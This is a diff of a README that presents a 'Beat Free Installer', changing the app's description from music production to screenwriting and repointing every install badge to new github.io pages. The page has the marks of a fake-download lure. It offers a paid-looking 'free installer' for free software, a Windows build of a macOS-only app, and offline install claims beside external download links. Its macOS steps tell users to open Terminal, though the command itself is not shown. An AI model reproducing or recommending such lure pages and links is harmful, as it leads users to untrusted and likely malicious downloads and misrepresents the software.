@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-DAW+/+Music+Production-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Screenwriting-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Beat Free Installer** — Beat is a minimalist, intuitive music production application for macOS. Works without internet access, no account required. Full offline installation.
+**💻 Beat Free Installer** — Beat is a free, open-source screenwriting application for macOS that uses Fountain plain-text markup. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Beat](https://img.shields.io/badge/⬇_Install_Beat-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Beat](https://img.shields.io/badge/⬇_Install_Beat-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Beat
 
-Beat is a minimalist, intuitive music production application for macOS. Designed as a simple loop-based sequencer with a clean interface, Beat helps musicians quickly sketch musical ideas, create patterns, and build tracks without the complexity of a full DAW. Its focused feature set and visual design make it accessible for beginners while remaining useful for quick ideation by experienced producers.
+Beat is a free, open-source screenwriting application for macOS that uses Fountain plain-text markup. It provides industry-standard screenplay formatting, index cards, scene outline, and print to PDF — all stored in portable, version-control-friendly plain text files.
 
 ---
 
 ## ❌ Problem: Beat is hard to access
 
-- **macOS Only** — No Windows version
-- **Limited Features** — Simple sequencer not suitable for professional production
-- **VST Support** — Plugin support limited compared to professional DAWs
-- **Export Options** — Limited export formats for integration with other tools
+- **macOS Only** — No Windows or Linux native version (web version available)
+- **Fountain Markup** — Requires learning Fountain syntax rather than WYSIWYG formatting
+- **Basic Feature Set** — Missing some features of commercial apps like Final Draft
+- **Small Community** — Fewer resources and templates than established screenwriting tools
 
 ---
 
@@ -61,9 +61,9 @@ Beat is a minimalist, intuitive music production application for macOS. Designed
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Beat is a minimalist, intuitive music production application for macOS. Designed
 
 <div align="center">
 
-[![⬇ Install Beat](https://img.shields.io/badge/⬇_Install_Beat-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Beat](https://img.shields.io/badge/⬇_Install_Beat-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Beat is a minimalist, intuitive music production application for macOS. Designed
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Beat is a minimalist, intuitive music production application for macOS. Designed
 
 ---
 
-**Beat Free Installer** — Beat is a minimalist, intuitive music production application for macOS. Install without internet connection today!
+**Beat Free Installer** — Beat is a free, open-source screenwriting application for macOS that uses Fountain plain-text markup. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Beat](https://img.shields.io/badge/⬇_Install_Beat-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Beat](https://img.shields.io/badge/⬇_Install_Beat-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
